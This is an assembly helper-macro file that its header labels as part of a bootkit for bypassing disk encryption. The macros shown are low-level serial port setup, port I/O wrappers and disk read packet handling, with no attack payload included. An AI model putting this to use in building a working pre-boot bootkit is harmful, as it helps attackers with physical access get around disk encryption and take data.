; bootkit for disk encryption bypass
; 15/06/2016 
;
; helper macros 
; -snp

%macro _outb 2
	mov al, %2
	mov dx, %1
	out dx, al
%endmacro

%macro _inb 1
	mov dx, %1
	in al, dx
%endmacro

%macro io_error 1
	mov si, %1
	call strlen
	mov word [buffer.total], ax
	mov si, %1
	call serial_write_ex
%endmacro 
	
%macro prepare_packet 0
	mov dl, [packet.disk]
	mov bx, word [packet.sectors]
	mov word [DPA_PACKET.sectors], bx
	mov bx, word [packet.startlo]
	mov word [DPA_PACKET.startlo], bx
	mov bx, word [packet.startlo+2]
	mov word [DPA_PACKET.startlo+2], bx
%endmacro

%macro read_packet 0
	mov word [buffer.count], 7 
	mov bx, packet
	call serial_read
%endmacro

%macro serial_init  0
	_outb SERIAL_PORT + 1, 0x00
   	_outb SERIAL_PORT + 3, 0x80
   	_outb SERIAL_PORT + 0, 0x01
   	_outb SERIAL_PORT + 1, 0x00
   	_outb SERIAL_PORT + 3, 0x03
   	_outb SERIAL_PORT + 2, 0xC7
   	_outb SERIAL_PORT + 4, 0x0B
%endmacro


